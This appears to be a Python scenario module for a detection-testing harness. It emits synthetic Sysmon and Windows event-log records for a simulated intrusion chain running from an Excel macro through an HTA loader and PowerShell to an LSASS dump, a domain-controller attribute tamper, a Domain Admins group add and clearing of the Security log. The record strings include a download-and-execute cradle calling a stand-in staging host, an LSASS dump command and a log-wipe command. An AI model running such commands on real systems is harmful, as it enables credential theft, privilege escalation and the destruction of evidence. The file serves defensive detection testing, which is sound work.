"""storyline_excel_loader_domain_abuse -- a malicious Excel workbook starts an HTA loader, the loader's
PowerShell reads LSASS, writes a shadow-credential attribute on the domain controller, adds the stolen
account to a privileged group and clears the Security log.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    loader_shell -> ps_cradle -> lsass_read -> directory_tamper -> group_escalation -> log_clear

WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7). Same purpose as ``storyline_endpoint_macro_c2``, with a
different shape: a DEEPER Sysmon tree (the HTA loader is the parent of the PowerShell, which is the
parent of every later helper process), two steps whose alerts come from the DOMAIN CONTROLLER's own log
(different ``Computer`` and a different ``meta.shipper_ip`` than the workstation), and no beacon burst, so
its raw key evidence is spawn links rather than acting-process links.

PROCESS TREE (workstation ``W``; the DC emits only Windows Security records)

    explorer -> EXCEL -> mshta (loader)  -> powershell P ---+--> hostname / ipconfig / net / nltest   (ps_cradle)
                                                            +--> dumper --EID10--> lsass          (lsass_read)
                                                            +--> ldifde                    (directory_tamper)
                                                            +--> net group                (group_escalation)
                                                            +--> wevtutil                       (log_clear)

TELEMETRY. Real parsers: ``sysmon`` (EID 1, 10) and ``windows_eventlog`` (4104, 5136, 4728, 1102).
No dependency gaps (``parse_expected=True`` everywhere).

STRUCTURE VARIES WITH THE SEED: account, workstation and DC addresses, script-block count (1-3), the AD
attribute, the dumper name and the privileged group.

SAFETY. Simulation only: ``.invalid`` names, private 10.0.0.0/8 addresses, a fixed calendar epoch, no wall
clock; command lines are strings inside log records and nothing runs.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, ScenarioDef  # noqa: E402
from scenario_kit import BASE_MS  # noqa: E402
from sysmon_tree import Emitter, Host  # noqa: E402

TAG = "eld"

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("loader_shell", "sysmon", True,
                  "Excel's macro starts an HTA loader (a document host spawns a script host)"),
    ChainStepSpec("ps_cradle", "windows_eventlog", True,
                  "the loader starts a PowerShell whose script block is a download-and-execute cradle"),
    ChainStepSpec("lsass_read", "sysmon", True,
                  "a dumper started by that PowerShell opens lsass.exe with a memory-read mask"),
    ChainStepSpec("directory_tamper", "windows_eventlog", True,
                  "the stolen account writes a shadow-credential attribute on the domain controller"),
    ChainStepSpec("group_escalation", "windows_eventlog", True,
                  "the stolen account is added to a privileged global group"),
    ChainStepSpec("log_clear", "windows_eventlog", True,
                  "the workstation's Security event log is cleared"),
)
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_group_change", "windows_eventlog", True,
                  "a helpdesk administrator adds a user to a local group on a file server (BENIGN)"),
)

_ACCOUNTS = ("r.treasury", "j.audit", "p.hr", "c.billing")
_WKS = ("wks-tre-04", "wks-aud-17", "wks-hr-19", "wks-bil-02")
_DUMPERS = ("rdrleakdiag.exe", "mdmp64.exe", "tasklist-x.exe")
_ATTRS = ("msDS-KeyCredentialLink", "servicePrincipalName", "msDS-AllowedToDelegateTo")
_GROUPS = ("Domain Admins", "Backup Operators", "Account Operators")
_CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://stage.example.invalid/l.ps1')"
_PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
_SYS = "C:\\Windows\\System32\\"
_OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"


def build(seed: int):
    rng = Random(seed * 1299743 + 53)
    user = rng.choice(_ACCOUNTS)
    wks_name = rng.choice(_WKS)
    wks_ip = f"10.43.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    dc_ip = f"10.43.0.{rng.randint(2, 9)}"
    dumper = rng.choice(_DUMPERS)
    attr = rng.choice(_ATTRS)
    group = rng.choice(_GROUPS)
    n_ps = 1 + seed % 3

    wks = Host(wks_name, wks_ip, seed)
    em = Emitter(seed, TAG, STEPS)
    notes: dict = {}
    t0 = BASE_MS

    explorer = wks.proc("C:\\Windows\\explorer.exe", "explorer.exe", user, t0 - 1_000)
    excel = wks.proc(_OFFICE + "EXCEL.EXE", "\"EXCEL.EXE\" C:\\Users\\Public\\Q3-forecast.xlsm", user, t0 + 2_000, explorer)
    mshta = wks.proc(_SYS + "mshta.exe", "mshta.exe http://stage.example.invalid/l.hta", user, t0 + 8_000, excel)
    ps = wks.proc(_SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -nop -w hidden", user, t0 + 14_000, mshta)
    recon = [wks.proc(_SYS + exe, cmd, user, t0 + 18_000 + i * 2_000, ps) for i, (exe, cmd) in enumerate((
        ("hostname.exe", "hostname"), ("ipconfig.exe", "ipconfig /all"),
        ("net.exe", "net user /domain"), ("nltest.exe", "nltest /dclist:corp.example")))]
    t_ps = t0 + 30_000
    drop = wks.proc(f"C:\\Users\\Public\\{dumper}", f"{dumper} -ma lsass.exe", user, t_ps + 40_000, ps)
    lsass = wks.proc(_SYS + "lsass.exe", "lsass.exe", "SYSTEM", t0 - 7_200_000)
    ldif = wks.proc(_SYS + "ldifde.exe", f"ldifde.exe -i -f C:\\Users\\Public\\{attr}.ldf", user, t_ps + 100_000, ps)
    netg = wks.proc(_SYS + "net.exe", f"net.exe group \"{group}\" {user} /add /domain", user, t_ps + 170_000, ps)
    wevt = wks.proc(_SYS + "wevtutil.exe", "wevtutil.exe cl Security", user, t_ps + 370_000, ps)

    for p in (explorer, excel, mshta):
        em.add("loader_shell", "sysmon", p.create_record(), p.start_ms, wks_ip)
    notes["loader_shell"] = f"{user} on {wks_name}: EXCEL -> mshta.exe"

    em.add("ps_cradle", "sysmon", ps.create_record(), ps.start_ms, wks_ip)
    for p in recon:
        em.add("ps_cradle", "sysmon", p.create_record(), p.start_ms, wks_ip)
    for i in range(n_ps):
        ts = t_ps + i * 10_000
        em.add("ps_cradle", "windows_eventlog",
               {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
                "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
                "ScriptBlockText": _CRADLE, "TimeCreated": ts}, ts, wks_ip)
    notes["ps_cradle"] = f"{n_ps} script-block event(s) on {wks_name}; 4 recon children of the PowerShell"

    em.add("lsass_read", "sysmon", drop.create_record(), drop.start_ms, wks_ip)
    t_acc = drop.start_ms + 5_000
    em.add("lsass_read", "sysmon", drop.access_record(t_acc, lsass.image, lsass.guid, lsass.pid, "0x1010"), t_acc, wks_ip)
    notes["lsass_read"] = f"{dumper} opens lsass.exe with GrantedAccess 0x1010"

    em.add("directory_tamper", "sysmon", ldif.create_record(), ldif.start_ms, wks_ip)
    t_dir = ldif.start_ms + 4_000
    em.add("directory_tamper", "windows_eventlog",
           {"EventID": 5136, "Computer": "dc01", "SubjectUserName": user, "SubjectDomainName": "CORP",
            "ObjectDN": "CN=svc-sql,OU=Services,DC=corp,DC=example", "ObjectClass": "user",
            "AttributeLDAPDisplayName": attr, "AttributeValue": "MSSQLSvc/db01.corp.example:1433",
            "OperationType": "%%14674", "TimeCreated": t_dir}, t_dir, dc_ip)
    notes["directory_tamper"] = f"{user} writes {attr} on CN=svc-sql via dc01"

    em.add("group_escalation", "sysmon", netg.create_record(), netg.start_ms, wks_ip)
    t_grp = netg.start_ms + 4_000
    em.add("group_escalation", "windows_eventlog",
           {"EventID": 4728, "Computer": "dc01", "SubjectUserName": user, "SubjectDomainName": "CORP",
            "TargetUserName": user, "TargetDomainName": "CORP", "MemberName": group,
            "TimeCreated": t_grp}, t_grp, dc_ip)
    notes["group_escalation"] = f"{user} added to {group}"

    em.add("log_clear", "sysmon", wevt.create_record(), wevt.start_ms, wks_ip)
    t_clr = wevt.start_ms + 3_000
    em.add("log_clear", "windows_eventlog",
           {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
            "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
            "TimeCreated": t_clr}, t_clr, wks_ip)
    notes["log_clear"] = f"{user} clears the Security log on {wks_name}"
    return em.payloads, {}, notes, None


def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    em = Emitter(seed, TAG + "d", DECOY_STEPS)
    ts = BASE_MS + 45_000
    em.add(spec.label, "windows_eventlog",
           {"EventID": 4732, "Computer": "fs02", "SubjectUserName": "helpdesk.adm", "SubjectDomainName": "CORP",
            "TargetUserName": "Remote Desktop Users", "TargetDomainName": "FS02", "MemberName": "n.newhire",
            "TimeCreated": ts}, ts, "10.44.0.8")
    return em.payloads


STORYLINE = ScenarioDef(
    name="excel_loader_domain_abuse",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_excel_loader_domain_abuse.yaml",
    summary="Excel -> HTA loader -> PowerShell on one workstation (Sysmon process tree), LSASS read, "
            "shadow-credential write and privileged-group add on the DC, Security log cleared",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS,
)
